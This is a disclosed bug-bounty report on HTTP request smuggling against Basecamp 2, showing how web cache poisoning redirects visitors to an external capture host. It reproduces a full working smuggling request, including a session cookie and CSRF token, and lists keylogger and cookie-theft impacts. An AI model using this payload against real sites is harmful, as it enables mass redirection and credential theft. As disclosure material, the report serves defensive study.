---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/http-request-smuggling
  - env/web
substate: "resolved"
weakness: "HTTP Request Smuggling"
enriched: true
body: true
date: 2020-10-28
submitted: 2020-07-08T18:38:41.851Z
bounty_usd: null
votes: 28
cve: []
program: "[[programs/basecamp|Basecamp]]"
reporter: "hazimaslam"
source: "https://hackerone.com/reports/919175"
title: "HTTP request smuggling on Basecamp 2 allows web cache poisoning"
---
# HTTP request smuggling on Basecamp 2 allows web cache poisoning

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 28 | **Program:** Basecamp | **Disclosed:** 2020-10-28

- Report: [https://hackerone.com/reports/919175](https://hackerone.com/reports/919175)
- CWE: HTTP Request Smuggling
- Submitted: 2020-07-08T18:38:41.851Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

It is found that an authenticated Basecamp 2 user can desync front and backend servers and poison the socket with harmful response for the next visitor.  During redirect probe, It also appears that front-end infrastructure performs caching of content. Using HTTP request smuggling attack, It is possible to poison the cache with the off-site redirect response using `X-Forwarded-Host` request header in smuggled request. This will make the attack persistent, affecting any user who subsequently requests the affected URL.

## Validation steps
**1.**  Open https://requestbin.com/r/enjv2g5042bg in your browser for request capturing.

**2.** Paste the following request in Burp repeater (I've embedded my session in the request for your ease):

```http
POST /4618984/account HTTP/1.1
Host: basecamp.com
Connection: keep-alive
Content-Length: 144
Accept: */*
X-CSRF-Token: BW5Kp3r1hLOuZI6+4GkBW5XUpkt55bi9tIiqgKFo1ZY=
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: _basecamp_session=BAh7CEkiD3Nlc3Npb25faWQGOgZFVEkiJTAwNzU0OTI3NWZjMTI0Zjk5ZTVlOGE5NTU0MGFhN2UyBjsAVEkiEF9jc3JmX3Rva2VuBjsARkkiMUJXNUtwM3IxaExPdVpJNis0R2tCVzVYVXBrdDU1Ymk5dElpcWdLRm8xWlk9BjsARkkiDnBlcnNvbl9pZAY7AEZpBHYSEQE%3D--ced0e607b9844aff72e0b9421e73e4d52c8b04bc;identity_id=BAhpBOwxQgE%3D--3a11dbd3096b61294dc6c864b807a87944e4b6ab;
Transfer-Encoding: chunked
Transfer-encoding: identity

22
_method=patch&account%5Bname%5D=BC
0

GET /x HTTP/1.1
X-Forwarded-Host: enjv2g5042bg.x.pipedream.net
X-Forwarded-Proto: http
Foo: bar
```
Make sure to set the target to `https://basecamp.com` and port to `443`.

**3.** Issue the request in repeater.

**4.** Observe the captured request in RequestBin.com

## Impact

- With request smuggling, attacker can serve harmful response to random people actively browsing the website, enabling straightforward mass-exploitation.

- By redirecting javascript imports to a malicious domain, an attacker can inject a key-logger and steal user passwords from login page.

- It is also possible to capture visitors' request headers and cookies.

## Timeline

- **Report Filed**
- **Report Title Updated**
- **Bounty Awarded**
- **Report Triaged**
- **2020-07-11** @hazimaslam: Thank you for the award!
- **2020-07-13** @georgeclaghorn: We’ve deployed a fix for this. The desync is between our load balancers and next-hop nginx servers. The load balancers now reject requests with both Content-Length and Transfer-Encoding headers with a 400 Bad Request response. This is technically a spec violation, but it’s our best option for now.

Mind confirming, @hazimaslam?
- **2020-07-14** @hazimaslam: Yes, confirming it is fixed.

{F907375}
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
